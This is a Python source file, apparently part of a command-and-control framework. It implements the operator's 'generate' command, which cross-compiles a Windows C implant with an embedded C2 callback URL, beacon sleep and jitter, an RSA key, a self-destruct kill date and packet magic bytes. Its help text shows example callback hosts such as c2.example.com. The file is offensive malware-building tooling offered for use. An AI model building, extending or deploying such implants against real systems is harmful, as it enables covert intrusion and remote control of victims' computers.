"""
CLI 'generate' command — cross-compile C agent with embedded config.

Usage in operator shell:
  generate                                    (defaults: current listener URL, keys/server_pub.pem)
  generate --url https://c2.example.com/api/v1 --sleep 30 --jitter 20
  generate --arch x86 --kill-date 2026-12-31
"""

import shlex
from pathlib import Path

from rich.console import Console

console = Console()


def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
    """Parse generate arguments and invoke the C agent build."""

    # Parse arguments from the command string
    parts = shlex.split(args_str) if args_str else []
    opts = {
        "url": "",
        "sleep": 60,
        "jitter": 25,
        "arch": "x64",
        "kill_date": "",
        "magic": 0xDEADF00D,
        "output": None,
    }

    i = 0
    while i < len(parts):
        if parts[i] in ("--url", "-u") and i + 1 < len(parts):
            opts["url"] = parts[i + 1]; i += 2
        elif parts[i] in ("--sleep", "-s") and i + 1 < len(parts):
            opts["sleep"] = int(parts[i + 1]); i += 2
        elif parts[i] in ("--jitter", "-j") and i + 1 < len(parts):
            opts["jitter"] = int(parts[i + 1]); i += 2
        elif parts[i] in ("--arch", "-a") and i + 1 < len(parts):
            opts["arch"] = parts[i + 1]; i += 2
        elif parts[i] == "--kill-date" and i + 1 < len(parts):
            opts["kill_date"] = parts[i + 1]; i += 2
        elif parts[i] == "--magic" and i + 1 < len(parts):
            m = parts[i + 1]
            opts["magic"] = int(m, 16) if m.startswith("0x") else int(m)
            i += 2
        elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
            opts["output"] = Path(parts[i + 1]); i += 2
        elif parts[i] in ("--help", "-h"):
            _print_help()
            return
        else:
            console.print(f"[red]Unknown option: {parts[i]}[/red]")
            _print_help()
            return

    # Auto-detect listener URL if not specified
    if not opts["url"]:
        if listeners:
            info = listeners[0].info()
            scheme = "https" if "HTTPS" in info.get("type", "") else "http"
            host = info.get("interface", "127.0.0.1")
            if host == "0.0.0.0":
                host = "127.0.0.1"
            port = info.get("port", 8443)
            opts["url"] = f"{scheme}://{host}:{port}/api/v1"
            console.print(f"[dim]Using listener URL: {opts['url']}[/dim]")
        else:
            opts["url"] = "https://127.0.0.1:8443/api/v1"
            console.print("[yellow]No active listener — using default URL[/yellow]")

    # Find RSA key
    rsa_path = project_root / "keys" / "server_pub.pem"
    if not rsa_path.exists():
        console.print("[yellow]⚠ No RSA key found at keys/server_pub.pem[/yellow]")
        console.print("[yellow]  Run 'python scripts/generate_keys.py' first.[/yellow]")
        console.print("[yellow]  Building without RSA key (key exchange will fail).[/yellow]")
        rsa_path = None

    # Find profile
    profile_path = project_root / "profiles" / "default.yaml"
    if not profile_path.exists():
        profile_path = None

    # Check MinGW
    cc = "x86_64-w64-mingw32-gcc" if opts["arch"] == "x64" else "i686-w64-mingw32-gcc"
    import shutil
    if not shutil.which(cc):
        console.print(f"[red]✗ {cc} not found![/red]")
        console.print("[yellow]  Install mingw-w64:[/yellow]")
        console.print("[yellow]    sudo apt install mingw-w64[/yellow]")
        return

    console.print(f"[cyan]Generating {opts['arch']} agent...[/cyan]")
    console.print(f"  C2 URL:    {opts['url']}")
    console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
    if opts["kill_date"]:
        console.print(f"  Kill date: {opts['kill_date']}")
    console.print()

    # Import and invoke build
    import sys
    sys.path.insert(0, str(project_root / "scripts"))
    from build_agent_c import build_agent

    try:
        exe_path = build_agent(
            project_root,
            listener_url=opts["url"],
            rsa_pubkey_path=rsa_path,
            sleep_sec=opts["sleep"],
            jitter_pct=opts["jitter"],
            kill_date=opts["kill_date"],
            magic=opts["magic"],
            arch=opts["arch"],
            output_path=opts["output"],
            profile_path=profile_path,
        )
        size_kb = exe_path.stat().st_size / 1024
        console.print(f"[green]✓ Agent built: {exe_path} ({size_kb:.1f} KB)[/green]")
    except FileNotFoundError as e:
        console.print(f"[red]✗ {e}[/red]")
    except RuntimeError as e:
        console.print(f"[red]✗ Build failed:[/red]")
        console.print(str(e))


def _print_help():
    console.print("""
[bold]generate[/bold] — Cross-compile C agent with embedded config

[bold]Options:[/bold]
  --url, -u URL         C2 callback URL (auto-detected from listener)
  --sleep, -s SEC       Beacon interval in seconds (default: 60)
  --jitter, -j PCT      Jitter percentage 0-99 (default: 25)
  --arch, -a ARCH       x64 or x86 (default: x64)
  --kill-date DATE      Agent self-destructs after YYYY-MM-DD
  --magic HEX           Packet magic bytes (default: 0xDEADF00D)
  --output, -o PATH     Output .exe path (default: builds/agent_ARCH.exe)

[bold]Examples:[/bold]
  generate
  generate --url https://cdn.example.com/api/v1 --sleep 30
  generate --arch x86 --kill-date 2026-12-31
""")
